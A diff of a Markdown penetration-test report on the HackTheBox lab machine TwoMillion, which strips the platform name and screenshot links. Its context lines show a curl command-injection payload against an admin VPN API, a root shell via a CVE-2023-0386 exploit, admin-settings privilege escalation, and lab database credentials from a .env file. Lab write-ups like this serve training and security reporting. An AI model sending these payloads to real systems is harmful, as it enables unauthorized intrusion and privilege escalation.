@@ -1,4 +1,4 @@
-# TwoMillion — HackTheBox Report
+# TwoMillion Report
 
 | Difficulty | OS    | Category |
 | ---------- | ----- | -------- |
@@ -425,8 +425,7 @@ curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=..." \
   --header "Content-Type: application/json" --data '{"username":"test;id;"}'
 → uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
-
-`https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920193446.png?raw=true` — command injection PoC returning `id` output inline with the VPN config generation response.
+Command injection PoC returning `id` output inline with the VPN config generation response.
 
 ---
 
@@ -452,7 +451,7 @@ root@2million:/tmp/CVE-2023-0386# whoami
 root
 ```
 
-`https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920200134.png?raw=true` — root shell obtained via the CVE-2023-0386 PoC.
+Root shell obtained via the CVE-2023-0386 PoC.
 
 > **Note on CVEs:** This finding maps directly to a known, publicly disclosed CVE in a versioned third-party component (the Linux kernel), so a CVE identifier is included above.
 
@@ -480,8 +479,6 @@ PUT /api/v1/admin/settings/update
 GET /api/v1/admin/auth → {"message": true}
 ```
 
-`https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920190618.png?raw=true`, `https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920190753.png?raw=true`
-
 ---
 
 ### 4. Plaintext Database Credentials Stored in Web-Readable `.env` — Medium
@@ -505,9 +502,6 @@ DB_DATABASE=htb_prod
 DB_USERNAME=admin
 DB_PASSWORD=SuperDuperPass123
 ```
-
-`https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920194134.png?raw=true`, `https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920194507.png?raw=true`
-
 ---
 
 ## Remediation Summary
